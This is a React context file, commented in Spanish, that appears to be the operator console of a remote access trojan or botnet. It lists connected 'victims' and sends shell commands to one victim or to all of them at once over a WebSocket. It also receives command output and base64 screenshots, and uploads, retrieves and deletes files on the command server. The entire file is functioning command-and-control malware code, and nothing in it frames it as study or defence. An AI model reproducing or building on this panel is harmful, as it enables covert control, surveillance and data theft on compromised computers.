import React, { createContext, useEffect, useState, useRef } from 'react';
import configuracion from '../app/Configuracion';

export const PanelContext = createContext();

export const ContextPanelProvider = ({ children }) => {
    const [clientes, setClientes] = useState({});
    const [idVictima, setidVictima] = useState();
    const [capturaBase64, setCapturaBase64] = useState("");
    const [respuestaComando, setRespuestaComando] = useState(null);
    const [respuestaEviarArchivo, setRespuestaEviarArchivo] = useState();
    const [respuestaRecuperarArchivo, setRespuestaRecuperarArchivo] = useState();
    const [listaAchivos, setlistaAchivos] = useState([]);
    const [urlServidor, seturlServidor] = useState('');
    const socketRef = useRef(null);  // Usamos useRef para manejar el WebSocket como un valor persistente
    const reconnectAttempts = useRef(0);  // Número de intentos de reconexión
    const maxReconnectAttempts = 5;  // Máximo número de intentos de reconexión

    const connectWebSocket = () => {
        // Verificamos si el WebSocket ya está conectado o en proceso
        if (socketRef.current && socketRef.current.readyState !== WebSocket.CLOSED) {
            console.log('WebSocket ya está conectado o en proceso.');
            return;
        }

        socketRef.current = new WebSocket(configuracion.urlServidor);

        socketRef.current.onopen = () => {
            console.log('WebSocket conectado como ADMINISTRADOR');
            socketRef.current.send(JSON.stringify({ tipo: 'ADMINISTRADOR' }));
            reconnectAttempts.current = 0;  // Reiniciar los intentos de reconexión al conectarse
        };

        socketRef.current.onmessage = (event) => {
            const data = JSON.parse(event.data);
            switch (data.tipo) {
                case 'LISTA':
                    setClientes(data.cuerpo);
                    recuperarListaArchivos();
                    break;
                case 'RESPUESTACOMANDO':
                    setRespuestaComando(data.cuerpo);
                    console.log('Respuesta del comando:', data.cuerpo);
                    break;
                case 'CAPTURA':
                    setCapturaBase64(data.cuerpo);
                    break;
                case 'RESPUESTA-GET':
                    setRespuestaRecuperarArchivo(data.cuerpo);
                    recuperarListaArchivos();
                    break;
                case 'RESPUESTA-SET':
                    setRespuestaEviarArchivo(data.cuerpo);
                    recuperarListaArchivos();
                    break;
                default:
                    console.warn('Tipo de mensaje no reconocido:', data.tipo);
            }
        };

        socketRef.current.onerror = (error) => {
            console.error('Error en WebSocket:', error);
        };

        socketRef.current.onclose = () => {
            console.log('WebSocket desconectado');
            // Intentar reconectar si no hemos alcanzado el máximo de intentos
            if (reconnectAttempts.current < maxReconnectAttempts) {
                reconnectAttempts.current += 1;
                setTimeout(connectWebSocket, 5000);  // Intentar reconectar después de 5 segundos
            } else {
                console.log('Se alcanzó el máximo número de intentos de reconexión.');
            }
        };
    };

    useEffect(() => {
        seturlServidor(configuracion.urlApi);
        connectWebSocket();

        return () => {
            if (socketRef.current) {
                socketRef.current.close();  // Cerrar el WebSocket cuando se desmonte el componente
            }
        };
    }, []);

    const enviarComando = (comando) => {
        if (socketRef.current && socketRef.current.readyState === WebSocket.OPEN) {
            socketRef.current.send(JSON.stringify({ tipo: 'COMANDO', id: idVictima, cuerpo: comando }));
        } else {
            console.error('WebSocket no está conectado.');
        }
    };

    const enviarComandoMasivo = (comando) => {
        if (socketRef.current && socketRef.current.readyState === WebSocket.OPEN) {
            socketRef.current.send(JSON.stringify({ tipo: 'COMANDOMASIVO', cuerpo: comando }));
        } else {
            console.error('WebSocket no está conectado.');
        }
    };

    const recuperarListaArchivos = async () => {
        try {
            const response = await fetch(`${configuracion.urlApi}listaArchivos`);
            if (!response.ok) throw new Error('Error al recuperar la lista de archivos');
            const data = await response.json();
            setlistaAchivos(data);
        } catch (error) {
            console.error('Error:', error);
        }
    };

    const eliminarArchivo = async (nombreArchivo) => {
        try {
            const response = await fetch(`${configuracion.urlApi}delete/${nombreArchivo}`, { method: 'DELETE' });
            if (!response.ok) throw new Error('Error al eliminar el archivo');
            
            // Asegúrate de retornar el JSON que contiene el mensaje
            const data = await response.json();
            return data; // Retornar los datos para que se usen en handleEliminarArchivo
        } catch (error) {
            console.error('Error al eliminar el archivo:', error.message);
            throw error; // Lanza el error para que sea manejado en handleEliminarArchivo
        }
    };

    const subirArchivo = async (archivo) => {
        const formData = new FormData();
        formData.append('archivo', archivo);

        try {
            const response = await fetch(`${configuracion.urlApi}upload`, { method: 'POST', body: formData });
            if (!response.ok) throw new Error('Error al subir el archivo');
            const data = await response.text();
            console.log('Archivo subido correctamente:', data);
            recuperarListaArchivos();
        } catch (error) {
            console.error('Error al subir el archivo:', error.message);
            recuperarListaArchivos();
        }
    };

    const descargarImagen = () => {
        const enlace = document.createElement("a");
        enlace.href = `data:image/png;base64,${capturaBase64}`;
        enlace.download = "captura_pantalla.png";
        document.body.appendChild(enlace);
        enlace.click();
        document.body.removeChild(enlace);
    };

    return (
        <PanelContext.Provider value={{
            clientes,
            setidVictima,
            enviarComando,
            respuestaComando,
            descargarImagen,
            capturaBase64,
            respuestaEviarArchivo,
            respuestaRecuperarArchivo,
            listaAchivos,
            eliminarArchivo,
            subirArchivo,
            urlServidor,
            enviarComandoMasivo
        }}>
            {children}
        </PanelContext.Provider>
    );
};
